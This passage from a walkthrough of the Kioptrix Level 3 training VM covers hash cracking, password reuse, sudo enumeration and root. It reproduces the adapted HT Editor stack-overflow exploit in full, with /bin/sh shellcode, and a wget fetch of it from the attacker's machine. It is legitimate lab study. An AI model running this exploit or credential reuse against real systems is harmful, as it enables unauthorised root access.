        <div>| userid | username | password | usertype  | firstname | lastname | email | datejoined | website | issuperuser | photo | joincode |</div>
        <div>+--------+----------+----------+-----------+-----------+----------+-------+------------+---------+-------------+-------+----------+</div>
        <div>|      1 | admin    | n0t7t1k4 | superuser | Super     | User     |       | 1302628616 |         |           1 |       |          |</div>
        <div>+--------+----------+----------+-----------+-----------+----------+-------+------------+---------+-------------+-------+----------+</div>
        <div>1 row in set (0.04 sec)</div>
    </div>
    <div><br /></div>
    <div>Using the MD5 decrypter website at <a target="_blank" href="https://hashkiller.co.uk/Cracker/MD5">https://hashkiller.co.uk/Cracker/MD5</a>, I was able to decipher the dev account passwords.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>0d3eccfb887aabd50f243b3f155c0f85 MD5 Mast3r</div>
        <div>5badcaf789d3d1d09794d8f021f40f0e MD5 starwars</div>
    </div>
    <div><br /></div>
    <div>Checking /etc/passwd, we have corresponding user accounts for both dev users.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>www-data@Kioptrix3:/home/www/<a target="_blank" href="http://kioptrix3.com">kioptrix3.com</a>$ cat /etc/passwd | grep -i bash</div>
        <div>root:x:0:0:root:/root:/bin/bash</div>
        <div>loneferret:x:1000:100:loneferret,,,:/home/loneferret:/bin/bash</div>
        <div>dreg:x:1001:1001:Dreg Gevans,0,555-5566,:/home/dreg:/bin/rbash</div>
    </div>
    <div><br /></div>
    <div>Time to see if their database passwords are the same as their local account passwords. I’ll try the loneferret account first.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>www-data@Kioptrix3:/home/www/<a target="_blank" href="http://kioptrix3.com">kioptrix3.com</a>$ su - loneferret</div>
        <div>Password: starwars</div>
        <div><br /></div>
        <div>loneferret@Kioptrix3:~$ sudo -l</div>
        <div>User loneferret may run the following commands on this host:</div>
        <div>    (root) NOPASSWD: !/usr/bin/su</div>
        <div>    (root) NOPASSWD: /usr/local/bin/ht</div>
    </div>
    <div><br /></div>
    <div>The first thing I did after logging in as the user was run sudo to see if there were any commands this account could run that my original account couldn’t. In this case, the user loneferret can run the HT Editor (located in /usr/local/bin/ht) as root. According to “company policy”, we really need to run this command.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>loneferret@Kioptrix3:~$ cat CompanyPolicy.README</div>
        <div>cat CompanyPolicy.README</div>
        <div>Hello new employee,</div>
        <div>It is company policy here to use our newly installed software for editing, creating and viewing files.</div>
        <div>Please use the command 'sudo ht'.</div>
        <div>Failure to do so will result in you immediate termination.</div>
        <div><br /></div>
        <div>DG</div>
        <div>CEO</div>
    </div>
    <div><br /></div>
    <div class="note"><b>NOTE:</b> Before going any further with this account and this exploit, I went ahead and SSH’d to the victim using the loneferret account and credentials. This way I had a much nicer shell to work in.</div>
    <div><br /></div>
    <div>Checking the version of the editor against known exploits...</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>loneferret@Kioptrix3:~$ /usr/local/bin/ht --version</div>
        <div>ht 2.0.18 (POSIX) 07:26:02 on Apr 16 2011</div>
        <div>(c) 1999-2004 Stefan Weyergraf</div>
        <div>(c) 1999-2009 Sebastian Biallas &lt;<a href="mailto:sb@biallas.net">sb@biallas.net</a>&gt;</div>
    </div>
    <div><br /></div>
    <div>...we have a known stack overflow issue with the installed version.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>HT Editor 2.0.18 - File Opening Stack Overflow                                                               | exploits/linux/local/17083.pl</div>
    </div>
    <div><br /></div>
    <div>Looking through the perl exploit script, there are several changes we’ll need to make to tailor it to run on our victim. First of all, it is written for Perl 5.10, but only Perl 5.8 is available on the victim.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>loneferret@Kioptrix3:~$ perl --version</div>
        <div>
            <div><br /></div>
        </div>
        <div>This is perl, v5.8.8 built for i486-linux-gnu-thread-multi</div>
        <div>[...snip...]</div>
    </div>
    <div><br /></div>
    <div>We’ll have to change the Perl 5.10 specific features back to more standard functions. Specifically, the use of ’say’ (changed to ‘print') and the ‘given/when’ switch structure (changed to 'if/else').</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>root@kali:~/Walkthroughs/kioptrix3# diff 17083.pl.old 17083.pl</div>
        <div>36d35</div>
        <div>&lt; use 5.010;</div>
        <div>50c49</div>
        <div>&lt; say'[*]Looking for $esp and endwin()...';</div>
        <div>---</div>
        <div>&gt; print'[*]Looking for $esp and endwin()...' . "\n";</div>
        <div>59c58</div>
        <div>&lt; say '[+]endwin() address found! (0x', $infos-&gt;[3],')';</div>
        <div>---</div>
        <div>&gt; print '[+]endwin() address found! (0x', $infos-&gt;[3],')' . "\n";</div>
        <div>65c64</div>
        <div>&lt; say '[+]$esp place found! (0x', $esp, ")\012Now exploiting...";</div>
        <div>---</div>
        <div>&gt; print '[+]$esp place found! (0x', $esp, ")\012Now exploiting..." . "\n";</div>
        <div>72,73c71</div>
        <div>&lt;       given(shift) {</div>
        <div>&lt;               when(/Linux/) {</div>
        <div>---</div>
        <div>&gt;               if ($_[0] =~ /Linux/) {</div>
        <div>75,76c73</div>
        <div>&lt;               }</div>
        <div>&lt;               when(/FreeBSD/) {</div>
        <div>---</div>
        <div>&gt;               }elsif ($_[0] =~ /FreeBSD/) {</div>
        <div>80d76</div>
        <div>&lt;       }</div>
        <div>84,85c80</div>
        <div>&lt;       given(shift) {</div>
        <div>&lt;               when("linux") {</div>
        <div>---</div>
        <div>&gt;               if ($_[0] eq "linux") {</div>
        <div>91,92c86</div>
        <div>&lt;               }</div>
        <div>&lt;               when("freebsd") {</div>
        <div>---</div>
        <div>&gt;               }elsif ($_[0] eq "freebsd") {</div>
        <div>95d88</div>
        <div>&lt;       }</div>
    </div>
    <div><br /></div>
    <div>Additionally, the script sets different variables based on the use of “Linux” vs “FreeBSD”. Unfortunately, the location it is expecting to find the editor app in on Linux (or victim’s os) doesn’t match what we actually have. It is looking for HT editor at /usr/bin/hte, but we have it installed at /usr/local/bin/ht.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>52c51</div>
        <div>&lt; my $namez = [qw#/usr/bin/hte /usr/local/bin/ht#];</div>
        <div>---</div>
        <div>&gt; my $namez = [qw#/usr/local/bin/ht /usr/local/bin/ht#];</div>
    </div>
    <div><br /></div>
    <div>Finally, the we want the script to run the HT editor using sudo (since our user has permission to run the editor as root without a password). To do this, we just need to prepend a parameter to the payload array (before it is passed to exec).</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>67c66</div>
        <div>&lt; my @payload = ($infos-&gt;[0], ("A" x ($infos-&gt;[1] - length(qx{pwd}))) . reverse(pack('H*', $infos-&gt;[3])) . reverse(pack('H*', $esp)) . $infos-&gt;[2]);</div>
        <div>---</div>
        <div>&gt; my @payload = ("sudo", $infos-&gt;[0], ("A" x ($infos-&gt;[1] - length(qx{pwd}))) . reverse(pack('H*', $infos-&gt;[3])) . reverse(pack('H*', $esp)) . $infos-&gt;[2]);</div>
    </div>
    <div><br /></div>
    <div>So, our final exploit script, with all the changes becomes...</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>root@kali:~/Walkthroughs/kioptrix3# cat 17083.pl</div>
        <div># Exploit Title: HT Editor File openning Stack Overflow (0day)</div>
        <div># Date: March 30th 2011</div>
        <div># Author: ZadYree</div>
        <div># Software Link: http://hte.sourceforge.net/downloads.html</div>
        <div># Version: &lt;= 2.0.18</div>
        <div># Tested on: Linux/Windows (buffer padding may differ on W32)</div>
        <div># CVE : None</div>
        <div>#!/usr/bin/perl</div>
        <div>=head1 TITLE</div>
        <div>
            <div><br /></div>
        </div>
        <div>HT Editor &lt;=2.0.18 0day Stack-Based Overflow Exploit</div>
        <div>
            <div><br /></div>
            <div><br /></div>
        </div>
        <div>=head1 DESCRIPTION</div>
        <div>
            <div><br /></div>
        </div>
        <div>The vulnerability is triggered by a too large argument (+ path) which simply lets you overwrite eip.</div>
        <div>
            <div><br /></div>
            <div><br /></div>
        </div>
        <div>=head2 AUTHOR</div>
        <div>
            <div><br /></div>
        </div>
        <div>ZadYree ~ 3LRVS Team</div>
        <div>
            <div><br /></div>
            <div><br /></div>
        </div>
        <div>=head3 SEE ALSO</div>
        <div>
            <div><br /></div>
        </div>
        <div>ZadYree's blog: z4d.tuxfamily.org   </div>
        <div>
            <div><br /></div>
        </div>
        <div>3LRVS blog: 3lrvs.tuxfamily.org</div>
        <div>
            <div><br /></div>
        </div>
        <div>Shellcodes based on</div>
        <div>http://www.shell-storm.org/shellcode/files/shellcode-606.php</div>
        <div>http://www.shell-storm.org/shellcode/files/shellcode-171.php</div>
        <div>
            <div><br /></div>
        </div>
        <div>=&gt; Thanks</div>
        <div>=cut</div>
        <div>
            <div><br /></div>
        </div>
        <div>my ($esp, $retaddr);</div>
        <div>my $scz =       [       "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e" .</div>
        <div>                                "\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8" .</div>
        <div>                                "\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67" .</div>
        <div>                                "\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30" .</div>
        <div>                                "\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4" .</div>
        <div>                                "\x53\x52\x54\x8a\xe2\xce\x81",</div>
        <div>                                "\xeb\x17\x5b\x31\xc0\x88\x43\x07\x89\x5b" .</div>
        <div>                                "\x08\x89\x43\x0c\x50\x8d\x53\x08\x52\x53" .</div>
        <div>                                "\xb0\x3b\x50\xcd\x80\xe8\xe4\xff\xff\xff" .</div>
        <div>                                "/bin/sh"       ];</div>
        <div>
            <div><br /></div>
        </div>
        <div>print'[*]Looking for $esp and endwin()...' . "\n";</div>
        <div>
            <div><br /></div>
        </div>
        <div>my $namez = [qw#/usr/local/bin/ht /usr/local/bin/ht#];</div>
        <div>
            <div><br /></div>
        </div>
        <div>my $infos = get_infos(qx{uname});   </div>
        <div>
            <div><br /></div>
        </div>
        <div>my $name = $infos-&gt;[0];</div>
        <div>
            <div><br /></div>
            <div><br /></div>
        </div>
        <div>print '[+]endwin() address found! (0x', $infos-&gt;[3],')' . "\n";</div>
        <div>
            <div><br /></div>
        </div>
        <div>for my $line(qx{objdump -D $name | grep "ff e4"}) {</div>
        <div>        $esp = "0" . $1, last if ($line =~ m{([a-f0-9]{7}).+jmp\s{4}\*%esp});</div>
        <div>}</div>
        <div>
            <div><br /></div>
        </div>
        <div>print '[+]$esp place found! (0x', $esp, ")\012Now exploiting..." . "\n";</div>
        <div>
            <div><br /></div>
        </div>
        <div>my @payload = ("sudo", $infos-&gt;[0], ("A" x ($infos-&gt;[1] - length(qx{pwd}))) . reverse(pack('H*', $infos-&gt;[3])) . reverse(pack('H*', $esp)) . $infos-&gt;[2]);</div>
        <div>exec(@payload);</div>
        <div>
            <div><br /></div>
        </div>
        <div>
            <div><br /></div>
        </div>
        <div>sub get_infos {</div>
        <div>                if ($_[0] =~ /Linux/) {</div>
        <div>                        return([$namez-&gt;[0], 4108, $scz-&gt;[0], getendwin("linux")]);</div>
        <div>                }elsif ($_[0] =~ /FreeBSD/) {</div>
        <div>                        return([$namez-&gt;[1], 271, $scz-&gt;[1], getendwin("freebsd")]);</div>
        <div>                }</div>
        <div>                #Possibility to add friends ^^</div>
        <div>}</div>
        <div>
            <div><br /></div>
        </div>
        <div>sub getendwin {</div>
        <div>                if ($_[0] eq "linux") {</div>
        <div>                        my $n = $namez-&gt;[0];</div>
        <div>                        for (qx{objdump -d $n | grep endwin}) {</div>
        <div>                                $retaddr = $1, last if ($_ =~ m{(.*) &lt;});</div>
        <div>                        }</div>
        <div>                        return($retaddr);</div>
        <div>                }elsif ($_[0] eq "freebsd") {</div>
        <div>                        return("282c2990");</div>
        <div>                }</div>
        <div>}</div>
    </div>
    <div><br /></div>
    <div>Time to transfer the exploit over to the victim and run it. Again, we’ll use python’s SimpleHTTPServer to download the file to the victim.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>loneferret@Kioptrix3:~$ wget -O 17083.pl 10.183.0.222:4321/17083.pl</div>
        <div>--05:14:18--  http://10.183.0.222:4321/17083.pl</div>
        <div>           =&gt; `17083.pl'</div>
        <div>Connecting to 10.183.0.222:4321... connected.</div>
        <div>HTTP request sent, awaiting response... 200 OK</div>
        <div>Length: 2,317 (2.3K) [text/x-perl]</div>
        <div>
            <div><br /></div>
        </div>
        <div>100%[==========================================================================================================&gt;] 2,317         --.--K/s</div>
        <div>
            <div><br /></div>
        </div>
        <div>05:14:18 (8.57 MB/s) - `17083.pl' saved [2317/2317]</div>
        <div>
            <div><br /></div>
        </div>
        <div>loneferret@Kioptrix3:~$ perl 17083.pl</div>
        <div>[*]Looking for $esp and endwin()...</div>
        <div>[+]endwin() address found! (0x0804a3f8)</div>
        <div>[+]$esp place found! (0x0818138b)</div>
        <div>Now exploiting...</div>
        <div>Error opening terminal: screen.xterm-256color.</div>
    </div>
    <div><br /></div>
    <div>When we first tried to run the exploit, we got an error “opening terminal”. To fix this, we just had to set the TERM environment variable.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>loneferret@Kioptrix3:~$ export TERM=linux</div>
    </div>
    <div><br /></div>
    <div>Running again...</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>loneferret@Kioptrix3:~$ perl 17083.pl</div>
        <div>[*]Looking for $esp and endwin()...</div>
        <div>[+]endwin() address found! (0x0804a3f8)</div>
        <div>[+]$esp place found! (0x0818138b)</div>
        <div>Now exploiting...</div>
        <div><br /></div>
        <div> File Edit Windows Help                                                                                                               05:14 13.05.2019</div>
        <div>��[x]���������������������������������������������������������������� log window ����������������������������������������������������������������1��Ŀ</div>
        <div>�ht 2.0.18 (POSIX) 07:26:02 on Apr 16 2011                                                                                                           �</div>
        <div>�(c) 1999-2004 Stefan Weyergraf                                                                                                                      �</div>
        <div>�(c) 1999-2009 Sebastian Biallas &lt;sb@biallas.net&gt;                                                                                                    �</div>
        <div>�appname = /usr/local/bin/ht                                                                                                                         �</div>
        <div>�config = /home/loneferret/.htcfg2                                                                                                                   �</div>
        <div>�error loading file /home/loneferret/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�</div>
        <div>�                                                                                                                                                    �</div>
        <div>�                                                                                                                                                    �</div>
        <div>�                                                                                                                                                    �</div>
        <div>�                                                                                                                                                    �</div>
        <div>[...snip...]</div>
        <div>
            <div>�                                                                                                                                                    �</div>
            <div>�                                                                                                                                                    �</div>
            <div>�                                                                                                                                                    �</div>
            <div>�                                                                                                                                                    �</div>
            <div>������������������������������������������������������������������������������������������������������������������������������������������������������</div>
            <div>root@Kioptrix3:/home/loneferret# id<br /></div>
            <div>uid=0(root) gid=0(root) groups=0(root)</div>
        </div>
    </div>
    <div><br /></div>
    <div>We have root! 😄</div>
    <div><br /></div>
    <div>Let’s get that root flag.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>root@Kioptrix3:/home/loneferret# cd /root</div>
        <div>root@Kioptrix3:/root# cat Congrats.txt</div>
        <div>Good for you for getting here.</div>
        <div>Regardless of the matter (staying within the spirit of the game of course)</div>
        <div>you got here, congratulations are in order. Wasn't that bad now was it.</div>
        <div>
            <div><br /></div>
        </div>
        <div>Went in a different direction with this VM. Exploit based challenges are</div>
        <div>nice. Helps workout that information gathering part, but sometimes we</div>
        <div>need to get our hands dirty in other things as well.</div>
        <div>Again, these VMs are beginner and not intented for everyone. </div>
        <div>Difficulty is relative, keep that in mind.</div>
        <div>
            <div><br /></div>
        </div>
        <div>The object is to learn, do some research and have a little (legal)</div>
        <div>fun in the process.</div>
        <div>
            <div><br /></div>
            <div><br /></div>
        </div>
        <div>I hope you enjoyed this third challenge.</div>
        <div>
            <div><br /></div>
        </div>
        <div>Steven McElrea</div>
        <div>aka loneferret</div>
        <div>http://www.kioptrix.com</div>
        <div>
            <div><br /></div>
            <div><br /></div>
        </div>
        <div>Credit needs to be given to the creators of the gallery webapp and CMS used</div>
        <div>for the building of the Kioptrix VM3 site.</div>
        <div>
            <div><br /></div>
        </div>
        <div>Main page CMS: </div>
        <div>http://www.lotuscms.org</div>
        <div>
            <div><br /></div>
        </div>
        <div>Gallery application:  </div>
        <div>Gallarific 2.1 - Free Version released October 10, 2009</div>
        <div>http://www.gallarific.com</div>
        <div>Vulnerable version of this application can be downloaded</div>
        <div>from the Exploit-DB website:</div>
        <div>http://www.exploit-db.com/exploits/15891/</div>
        <div>
            <div><br /></div>
        </div>
        <div>The HT Editor can be found here:</div>
        <div>http://hte.sourceforge.net/downloads.html</div>
        <div>And the vulnerable version on Exploit-DB here:</div>
        <div>http://www.exploit-db.com/exploits/17083/</div>
        <div>
            <div><br /></div>
            <div><br /></div>
        </div>
        <div>Also, all pictures were taken from Google Images, so being part of the</div>
        <div>public domain I used them.</div>
    </div>
    <div><br /></div>
    <div><br /></div>
    <div><h2>Pivoting</h2></div>
    <div>N/A</div>
    <div><br /></div>
    <div><br /></div>
    <div><h2>Clean Up</h2></div>
    <div><br /></div>
    <div>*** STOP /home/www/<a target="_blank" href="http://kioptrix3.com/gallery/photos">kioptrix3.com/gallery/photos</a>/thumb_daqpu89u9h.jpg ***</div>
    <div>*** REMOVE /home/www/<a target="_blank" href="http://kioptrix3.com/gallery/photos">kioptrix3.com/gallery/photos</a>/thumb_daqpu89u9h.jpg ***</div>
    <div>*** REMOVE /home/loneferret/17083.pl ***</div>
    <div><br /></div>
    <div><br /></div>
    <div><h2>Additional Info</h2></div>
    <div>N/A</div>
    <div><br /></div>
    <div><br /></div>